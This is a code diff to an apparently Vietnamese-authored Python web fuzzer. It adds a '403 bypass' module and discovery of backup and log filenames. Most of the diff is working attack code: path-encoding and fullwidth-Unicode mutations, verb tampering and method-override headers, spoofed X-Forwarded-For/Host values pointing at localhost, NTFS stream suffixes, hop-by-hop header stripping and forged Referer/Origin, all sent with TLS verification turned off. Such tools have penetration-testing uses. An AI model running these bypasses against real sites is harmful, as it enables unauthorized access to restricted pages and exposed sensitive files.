+                # Strategy C: Prepend Injection
+                # /admin -> /%85/admin
+                var_prepend = "/" + hex_char + "/" + "/".join(segments)
+                variations.append(var_prepend)
+
+                # Strategy D: Leading Byte
+                # /admin -> /%85admin
+                var_lead = "/" + hex_char + "".join(segments) # Note: this merges path if multiple segments? 
+                # Better: /%85segment1/segment2
+                var_lead_seg = "/" + hex_char + segments[0]
+                if len(segments) > 1:
+                     var_lead_seg += "/" + "/".join(segments[1:])
+                variations.append(var_lead_seg)
+
+                # Send
+                for v_path in list(set(variations)):
+                    try:
+                        bypass_url = base_origin + v_path
+                        req = requests.Request('GET', bypass_url, headers=base_headers)
+                        prepped = session.prepare_request(req)
+                        prepped.url = bypass_url 
+                        
+                        res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                        
+                        if res.status_code == 200 and not is_soft_404(res):
+                            success_msg.append(f"{Colors.GREEN}[Byte Fuzz: ...{hex_char}... ({v_path})]{Colors.RESET}")
+                    except: pass
+    except: pass
+    
+    # 8. Escape Sequence Fuzzing (\x, \u, .. variations) - [NEW]
+    # Covers: \u002e, \x2e, \u002f, \x2f and double-escaped versions
+    try:
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path
+        if not path: path = "/"
+        base_origin = f"{parsed.scheme}://{parsed.netloc}"
+        
+        esc_variations = []
+        
+        # A. Path Separator Swapping
+        # /admin/user -> \u002fadmin\u002fuser
+        if "/" in path:
+            esc_variations.append(path.replace("/", "\\u002f"))
+            esc_variations.append(path.replace("/", "\\x2f"))
+            esc_variations.append(path.replace("/", "\\")) # Backslash swap
+            esc_variations.append(path.replace("/", "\\\\")) # Double backslash
+
+        # B. Dot Swapping
+        if "." in path:
+            esc_variations.append(path.replace(".", "\\u002e"))
+            esc_variations.append(path.replace(".", "\\x2e"))
+            
+        # C. Traversal Injection with Escapes
+        # Appends /.. but with escape chars to confuse parser
+        if not path.endswith('/'): path += "/"
+        
+        # List of ".." equivalents
+        dot_dots = [
+            "\\u002e\\u002e",     # \u002e\u002e
+            "\\x2e\\x2e",         # \x2e\x2e
+            "\\u002e\\u002e/",    # \u002e\u002e/
+            "\\x2e\\x2e/",        # \x2e\x2e/
+            "..\\u002f",          # ..\u002f
+            "..\\x2f",            # ..\x2f
+            "\\u002e\\u002e\\u002f", # \u002e\u002e\u002f
+            "%5cu002e%5cu002e",   # Encoded backslash version
+        ]
+        
+        for dd in dot_dots:
+            # Suffix injection: /path/..
+            esc_variations.append(path + dd)
+            # Suffix injection (cleaned): /path..
+            esc_variations.append(path.rstrip('/') + dd)
+
+        # Send
+        for v_path in list(set(esc_variations)):
+            try:
+                # Need to handle leading slash if replaced
+                if not v_path.startswith('/') and not v_path.startswith('\\'):
+                     v_path = "/" + v_path
+                     
+                bypass_url = base_origin + v_path
+                req = requests.Request('GET', bypass_url, headers=base_headers)
+                prepped = session.prepare_request(req)
+                prepped.url = bypass_url 
+                
+                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                
+                if res.status_code == 200 and not is_soft_404(res):
+                    success_msg.append(f"{Colors.GREEN}[Escape Fuzz: {v_path}]{Colors.RESET}")
+            except: pass
+    except: pass
+
+    # 9. HTTP Methods & Verb Tampering - [NEW]
+    # Checks if ACL only blocks GET but allows others
+    # Useful for REST APIs, Django, Spring Boot
+    try:
+        methods = ['POST', 'PUT', 'PATCH', 'TRACE', 'HEAD', 'OPTIONS', 'CONNECT', 'PROPFIND']
+        for method in methods:
+            try:
+                # Standard method change
+                req = requests.Request(method, url, headers=base_headers)
+                prepped = session.prepare_request(req)
+                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                
+                if res.status_code == 200 and not is_soft_404(res):
+                    status_lbl = f"{Colors.GREEN}[Method: {method}]{Colors.RESET}"
+                    if method == 'HEAD': 
+                        c_len = int(res.headers.get('Content-Length', 0))
+                        status_lbl += " (Len: {})".format(c_len)
+                        if c_len == 0:
+                            status_lbl += f" {Colors.YELLOW}[Low Confidence]{Colors.RESET}"
+                    success_msg.append(status_lbl)
+                
+                # Method Override Headers (X-HTTP-Method-Override)
+                # Useful when WAF blocks POST/PUT but App supports Override on GET
+                headers_override = base_headers.copy()
+                headers_override['X-HTTP-Method-Override'] = method
+                req_ov = requests.Request('GET', url, headers=headers_override)
+                prepped_ov = session.prepare_request(req_ov)
+                res_ov = session.send(prepped_ov, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+
+                if res_ov.status_code == 200 and not is_soft_404(res_ov):
+                    success_msg.append(f"{Colors.GREEN}[Method-Override: {method}]{Colors.RESET}")       
+            except: pass
+    except: pass
+
+    # 10. Unicode Normalization (NFKC/NFKD) - [NEW]
+    # Exploits Python/Node.js/Java string normalization logic.
+    # Uses Full-width characters to bypass WAF string matching.
+    try:
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path
+        base_origin = f"{parsed.scheme}://{parsed.netloc}"
+        
+        # Dictionary of Full-width substitutions for common chars
+        # a -> ａ, d -> ｄ, m -> ｍ, i -> ｉ, n -> ｎ, etc.
+        # Only mapping alphanumeric to full-width versions (U+FF01 to U+FF5E)
+        
+        def to_full_width(s):
+            res = ""
+            for char in s:
+                code = ord(char)
+                if 0x21 <= code <= 0x7E:
+                     # ASCII to Full-width: + 0xFEE0
+                     res += chr(code + 0xFEE0)
+                else:
+                    res += char
+            return res
+            
+        path_variations = []
+        path_no_slash = path.lstrip('/')
+        
+        if path_no_slash:
+             # Variant 1: Full conversion
+             # /admin -> /ａｄｍｉｎ
+             path_variations.append("/" + to_full_width(path_no_slash))
+             
+             # Variant 2: Partial conversion (First char only)
+             # /admin -> /ａdmin
+             if len(path_no_slash) > 0:
+                 first_char = path_no_slash[0]
+                 rest = path_no_slash[1:]
+                 if 0x21 <= ord(first_char) <= 0x7E:
+                     path_variations.append("/" + chr(ord(first_char) + 0xFEE0) + rest)
+
+        for v_path in path_variations:
+            try:
+                # Note: requests/urllib might auto-encode these to UTF-8 bytes (%ef%bd%81...)
+                # This is actually DESIRED because the Server receives bytes, decodes utf-8 to unicode strings,
+                # then normalizes.
+                bypass_url = base_origin + v_path
+                req = requests.Request('GET', bypass_url, headers=base_headers)
+                prepped = session.prepare_request(req)
+                prepped.url = bypass_url 
+                
+                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                
+                if res.status_code == 200 and not is_soft_404(res):
+                    success_msg.append(f"{Colors.GREEN}[Unicode NFKC: {v_path}]{Colors.RESET}")
+            except: pass
+    except: pass
+
+    # 11. Cloud/WAF Headers & Port Bypass - [NEW]
+    # Specialized headers for specific WAFs and internal routing that are not in basic list.
+    try:
+        # A. unique Extended Headers (Not in BYPASS_HEADERS_LIST)
+        waf_headers = [
+            {"X-HTTP-Host-Override": "127.0.0.1"},
+            {"Forwarded": "for=127.0.0.1;by=127.0.0.1;proto=http"},
+             # Some WAFs check for specific private ranges
+            {"X-Forwarded-For": "192.168.1.1"}, 
+            {"X-Forwarded-For": "10.0.0.1"},
+            {"X-Forwarded-For": "172.16.0.1"},
+        ]
+        
+        parsed = urllib.parse.urlparse(url)
+        
+        for h_dict in waf_headers:
+             try:
+                 new_headers = base_headers.copy()
+                 new_headers.update(h_dict)
+                 
+                 req = requests.Request('GET', url, headers=new_headers)
+                 prepped = session.prepare_request(req)
+                 res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                 
+                 if res.status_code == 200 and not is_soft_404(res):
+                     lbl = ",".join(h_dict.keys())
+                     success_msg.append(f"{Colors.GREEN}[WAF Header: {lbl}]{Colors.RESET}")
+             except: pass
+
+        # B. Host Header Port Injection (Virtual Host Bypass)
+        # Host: target.com:80, Host: target.com:443, Host: localhost
+        ports = [80, 443, 8080, 8443]
+        base_netloc = parsed.netloc.split(':')[0] # remove existing port
+        
+        for p in ports:
+            try:
+                new_headers = base_headers.copy()
+                new_headers['Host'] = f"{base_netloc}:{p}"
+                
+                req = requests.Request('GET', url, headers=new_headers)
+                prepped = session.prepare_request(req)
+                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                
+                if res.status_code == 200 and not is_soft_404(res):
+                     success_msg.append(f"{Colors.GREEN}[Host Port: :{p}]{Colors.RESET}")
+            except: pass
+            
+    except: pass
+    
+    # 12. Windows/IIS/NTFS Stream Traits (Effective on some Nginx proxies) - [NEW]
+    # ::$DATA, Trailing Dots/Spaces handled weirdly by reverse proxies
+    try:
+        parsed = urllib.parse.urlparse(url)
+        path = parsed.path
+        if not path: path = "/"
+        base_origin = f"{parsed.scheme}://{parsed.netloc}"
+        
+        win_suffixes = [
+            "::$DATA",             # NTFS Stream
+            " ",                   # Trailing Space (Windows ignores)
+            ".",                   # Trailing Dot (Windows ignores)
+            "..",                  # Trailing Dot Dot
+            "?",                   # Empty Query
+            "??",
+            "//",                  # Trailing double slash
+            "::$DATA"
+        ]
+        
+        for ws in win_suffixes:
+            try:
+                # Append to path (handled better than suffix list for raw sending)
+                bypass_url = base_origin + path + ws
+                req = requests.Request('GET', bypass_url, headers=base_headers)
+                prepped = session.prepare_request(req)
+                prepped.url = bypass_url 
+                
+                res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                if res.status_code == 200 and not is_soft_404(res):
+                    success_msg.append(f"{Colors.GREEN}[Win/Stream: ...{ws}]{Colors.RESET}")
+            except: pass
+    except: pass
+
+    # 13. Hop-By-Hop Header Abuse - [NEW]
+    # Instructs the Load Balancer/Proxy to drop specific headers known to block requests.
+    try:
+        # Common headers used for ACLs that we want the Proxy to drop before sending to backend
+        hop_headers = ["X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP", "Cookie", "Authorization"]
+        
+        for h_drop in hop_headers:
+             try:
+                 new_headers = base_headers.copy()
+                 # Syntax: "Connection: close, HeaderName" causes proxy to remove HeaderName
+                 new_headers["Connection"] = f"close, {h_drop}" 
+                 
+                 req = requests.Request('GET', url, headers=new_headers)
+                 prepped = session.prepare_request(req)
+                 res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                 
+                 if res.status_code == 200 and not is_soft_404(res):
+                      success_msg.append(f"{Colors.GREEN}[Hop-By-Hop Drop: {h_drop}]{Colors.RESET}")
+             except: pass
+    except: pass
+
+    # 14. Trusted Referer & Origin Spoofing - [NEW]
+    # Effective against "hotlink protection" or internal-only Access Control checks.
+    try:
+        parsed = urllib.parse.urlparse(url)
+        base = f"{parsed.scheme}://{parsed.netloc}"
+        
+        trust_origins = [
+            base,                       # Self-referencing
+            base + "/admin",            # Pretend coming from admin panel
+            base + "/login",            # Pretend coming from login
+            "http://127.0.0.1",         # Localhost referral
+            "https://localhost",
+            "null"                      # Sometimes bypasses null origin checks
+        ]
+        
+        for trust_ref in trust_origins:
+             try:
+                 h_ref = base_headers.copy()
+                 h_ref['Referer'] = trust_ref
+                 h_ref['Origin'] = trust_ref
+                 
+                 req = requests.Request('GET', url, headers=h_ref)
+                 prepped = session.prepare_request(req)
+                 res = session.send(prepped, proxies=proxies, timeout=timeout, allow_redirects=False, verify=False)
+                 
+                 if res.status_code == 200 and not is_soft_404(res):
+                      success_msg.append(f"{Colors.GREEN}[Trusted Ref: {trust_ref}]{Colors.RESET}")
+             except: pass
+    except: pass
+
+    if success_msg:
+        # Loại bỏ trùng lặp và trả về danh sách
+        return sorted(list(set(success_msg)))
+
+    return []
+
+def check_url(session, url, base_headers, proxies, filters, use_random_agent, delay, match_codes, filter_codes, output_file, timeout, soft_404_signatures=None, retry_count=0, bypass_403=False):
     try:
         if delay > 0 and retry_count == 0: time.sleep(delay)
 
@@ -575,7 +1462,7 @@ def check_url(session, url, base_headers, proxies, filters, use_random_agent, de
                 wait_t = 10 * (retry_count + 1)
                 tqdm.write(f"{Colors.YELLOW}[!] 429 Too Many Requests tại {url}. Đang ngủ {wait_t}s rồi thử lại... (Total 429: {curr_failed}){Colors.RESET}")
                 time.sleep(wait_t)
-                return check_url(session, url, base_headers, proxies, filters, use_random_agent, delay, match_codes, filter_codes, output_file, timeout, soft_404_signatures, retry_count + 1)
+                return check_url(session, url, base_headers, proxies, filters, use_random_agent, delay, match_codes, filter_codes, output_file, timeout, soft_404_signatures, retry_count + 1, bypass_403)
             else:
                 tqdm.write(f"{Colors.RED}[!] Bỏ qua {url} sau 3 lần gặp 429.{Colors.RESET}")
                 return
@@ -591,17 +1478,34 @@ def check_url(session, url, base_headers, proxies, filters, use_random_agent, de
         # --- SOFT 404 CHECK ---
         # Nếu đã bật Smart 404, ta kiểm tra xem response này có giống trang Soft 404 không
         if soft_404_signatures:
-            # Lấy domain base để đối chiếu signature
             parsed = urllib.parse.urlparse(url)
             base = f"{parsed.scheme}://{parsed.netloc}"
             
             if base in soft_404_signatures:
-                sig_status, sig_size = soft_404_signatures[base]
-                if sig_status and sig_size:
-                     # Nếu status giống status 404 VÀ size xấp xỉ size 404 (chênh lệch < 5%)
-                     # Hoặc nếu status trả về 200 nhưng size lại bằng size của trang lỗi 404
-                     if status == sig_status and abs(size_bytes - sig_size) < (sig_size * 0.05 + 10):
-                         return # Bỏ qua, đây là Soft 404
+                sig = soft_404_signatures[base]
+                if sig:
+                    # 1. Check Status
+                    if status == sig['status']:
+                        # 2. Check Redirect Location (nếu có)
+                        if sig['is_redirect']:
+                            curr_loc = res.headers.get('Location', '')
+                            if curr_loc == sig['location']:
+                                return # Soft 404 Redirect
+                        
+                        # 3. Check Size (Fast check)
+                        # Nếu size rất gần nhau (<5%) -> 99% Soft 404
+                        size_diff = abs(size_bytes - sig['avg_size'])
+                        if size_diff < (sig['avg_size'] * 0.05 + 20): 
+                            return 
+
+                        # 4. Check Structure (Jaccard) - Advanced
+                        # Nếu size lệch (do tên file reflected vào), check cấu trúc content
+                        # Chỉ check nếu response text đủ dài để thống kê
+                        if len(res.text) > 100:
+                            curr_tokens = extract_tokens(res.text)
+                            similarity = calculate_jaccard(sig['tokens'], curr_tokens)
+                            if similarity > 0.90: # Cấu trúc giống > 90%
+                                return # Soft 404 Dynamic Content
 
         content_for_search = str(res.headers) + "\n" + res.text 
         if filters['exclude_regex'] and filters['exclude_regex'].search(content_for_search): return
@@ -610,13 +1514,30 @@ def check_url(session, url, base_headers, proxies, filters, use_random_agent, de
         size_str = format_size(size_bytes)
         color = get_color_for_status(status)
         
+        bypass_results = []
+        # --- 403 BYPASS ATTEMPT ---
+        if status == 403 and bypass_403:
+            bypass_results = attempt_bypass_403(session, url, current_headers, proxies, timeout, soft_404_signatures)
+
         # 1. In ra màn hình (Có màu)
         msg_console = f"{color}[{status}]{Colors.RESET} | {Colors.CYAN}{size_str:>20}{Colors.RESET} | {url}"
-        tqdm.write(msg_console)
+        
+        if bypass_results:
+             tqdm.write(msg_console + f" {Colors.GREEN}[BYPASS FOUND! ({len(bypass_results)} payloads)]{Colors.RESET}")
+             for item in bypass_results:
+                 tqdm.write(f"    └── {item}")
+        else:
+             tqdm.write(msg_console)
 
         # 2. Ghi ra file (Không màu, định dạng text thuần)
         if output_file:
             msg_file = f"[{status}] | {size_str} | {url}"
+            if bypass_results: 
+                msg_file += " [BYPASS SUCCESS]"
+                for item in bypass_results:
+                     # Strip ANSI colors manually or using regex if available
+                     clean_item = re.sub(r'\x1b\[[0-9;]*m', '', item)
+                     msg_file += f"\n    --> {clean_item}"
             save_to_file(output_file, msg_file)
 
     except Exception:
@@ -716,9 +1637,22 @@ def main():
             wordlist_endpoints = list(set([normalize_endpoint(line, args.ext) for line in f if line.strip()]))
 
     for target in target_list:
+        # --- ONLY BYPASS 403 MODE ---
+        if args.only_bypass_403:
+             all_scan_urls.append(target)
+             continue
+        
         if 'FUZZ' in target:
             current_endpoints = list(wordlist_endpoints)
-
+            
+            # --- INTELLIGENT PATH CONTEXT GENERATION ---
+            # Tự động sinh ra payload dựa trên domain và path hiện tại (Nếu có FUZZ)
+            # VD: sub.domain.com/path/FUZZ -> sub_domain.zip, path.rar...
+            context_payloads = generate_path_context_payloads(target, active_suffixes)
+            if context_payloads:
+                print(f"{Colors.YELLOW}[*] Generated {len(context_payloads)} smart context payloads from URL path.{Colors.RESET}")
+                current_endpoints.extend(context_payloads)
+                
             if not current_endpoints and args.scan_logs:
                  if args.scan_logs != "DEFAULT":
                      current_endpoints.extend([x.strip() for x in args.scan_logs.split(',') if x.strip()])
@@ -744,6 +1678,9 @@ def main():
 
         parsed = urllib.parse.urlparse(target)
         base = f"{parsed.scheme}://{parsed.netloc}"
+        path = parsed.path
+        if not path.endswith('/'): path = os.path.dirname(path) + '/'
+        
         
         # --- LOG SCAN MODE ---
         if args.scan_logs:
@@ -814,8 +1751,11 @@ def main():
             
             # Generate: 2022-01-01.log, 2022_01_01.zip, ...
             if date_payloads:
-                # Các prefix thường gặp đi kèm date
-                log_prefixes = ['log_', 'logs_', 'error_', 'access_', 'db_', 'database_', 'backup_', 'www_', 'data_', ''] 
+                # Các prefix thường gặp đi kèm date (đứng trước): log_2022...
+                log_prefixes = ['log_', 'logs_', 'error_', 'ERR_', 'access_', 'db_', 'database_', 'backup_', 'www_', 'data_', ''] 
+                
+                # Các suffix thường gặp đi kèm date (đứng sau): 2022_LOG...
+                log_suffixes_date = ['_LOG', '_LOGS', '_ERR', '_Images', '_log', '_err', '_images', '_error', '_access', '_backup']
 
                 for d in date_payloads:
                     # Clean date string (nếu muốn): Xóa ký tự đầu nếu là separator để tránh trùng lặp xấu
@@ -828,24 +1768,28 @@ def main():
                          # 2. Prefix + Date + Ext: error_2022-07-21.log
                          for p in log_prefixes:
                               if p: all_scan_urls.append(base + path + p + clean_d + ext)
+                        
+                         # 3. Date + Suffix + Ext: 2022-07-21_LOG.log (NEW)
+                         for s in log_suffixes_date:
+                              all_scan_urls.append(base + path + clean_d + s + ext)
 
             # --- DOMAIN-BASED LOG FILENAMES (Mới) ---
-            # Generate: fptplay.log, dev.fptplay.vn.zip, fptplay_error.log ...
+            # Generate: domain.log, dev.domain.com.zip, domain_error.log ...
             try:
                 hostname = parsed.hostname
                 if hostname:
                     domain_parts = hostname.split('.')
                     chk_names = set()
-                    chk_names.add(hostname) # dev.fptplay.vn
-                    chk_names.add(hostname.replace('.', '_')) # dev_fptplay_vn
+                    chk_names.add(hostname) # dev.domain.com
+                    chk_names.add(hostname.replace('.', '_')) # dev_domain_com
                     
                     if len(domain_parts) >= 2:
-                        chk_names.add(domain_parts[-2]) # fptplay
-                        chk_names.add(f"{domain_parts[-2]}.{domain_parts[-1]}") # fptplay.vn
-                        chk_names.add(f"{domain_parts[-2]}_{domain_parts[-1]}") # fptplay_vn
+                        chk_names.add(domain_parts[-2]) # domain
+                        chk_names.add(f"{domain_parts[-2]}.{domain_parts[-1]}") # domain.com
+                        chk_names.add(f"{domain_parts[-2]}_{domain_parts[-1]}") # domain_com
                     
                     # Log variation suffixes
-                    # vd: fptplay.log, fptplay_error.log
+                    # vd: domain.log, domain_error.log
                     log_suffixes = ['', '_error', '_access', '_backup', '_db', '_database', '-error', '-access', '-backup']
 
                     for name in chk_names:
@@ -867,13 +1811,17 @@ def main():
             all_scan_urls.extend(generate_mutations(base, ep, active_suffixes, active_infixes, active_prefixes, date_payloads))
     
     # --- DOMAIN FUZZING (NEW) ---
-    if args.fuzz_domain:
+    if args.fuzz_domain and not args.only_bypass_403:
         print(f"{Colors.YELLOW}[*] Generating domain-based payloads...{Colors.RESET}")
         for target in target_list:
             all_scan_urls.extend(generate_domain_payloads(target, active_suffixes, active_infixes, active_prefixes, date_payloads))
 
     all_scan_urls = list(set(all_scan_urls))
     total = len(all_scan_urls)
+    
+    # Auto-enable bypass_403 if only_bypass_403 is set
+    if args.only_bypass_403:
+        args.bypass_403 = True
     
     if total == 0:
         print(f"{Colors.RED}[!] Không có payload.{Colors.RESET}"); sys.exit(0)
@@ -901,14 +1849,14 @@ def main():
         
         for base in unique_bases:
             sig = detect_soft_404(session, base, base_headers, proxies)
-            if sig[0] is not None:
+            if sig:
                 soft_404_signatures[base] = sig
-                print(f"{Colors.GREY}   + {base} -> 404 Size: {sig[1]} bytes (Status: {sig[0]}){Colors.RESET}")
+                print(f"{Colors.GREY}   + {base} -> 404 Sig: Status={sig['status']}, AvgSize={sig['avg_size']:.0f}, Redirect={sig['is_redirect']}{Colors.RESET}")
 
 
     try:
         executor = ThreadPoolExecutor(max_workers=args.threads)
-        futures = [executor.submit(check_url, session, link, base_headers, proxies, filters, args.random_agent, args.delay, match_codes, filter_codes, args.output_file, args.timeout, soft_404_signatures) for link in all_scan_urls]
+        futures = [executor.submit(check_url, session, link, base_headers, proxies, filters, args.random_agent, args.delay, match_codes, filter_codes, args.output_file, args.timeout, soft_404_signatures, 0, args.bypass_403) for link in all_scan_urls]
         
         for _ in tqdm(as_completed(futures), total=total, unit="req", dynamic_ncols=True, mininterval=0.2,
                       bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]"):
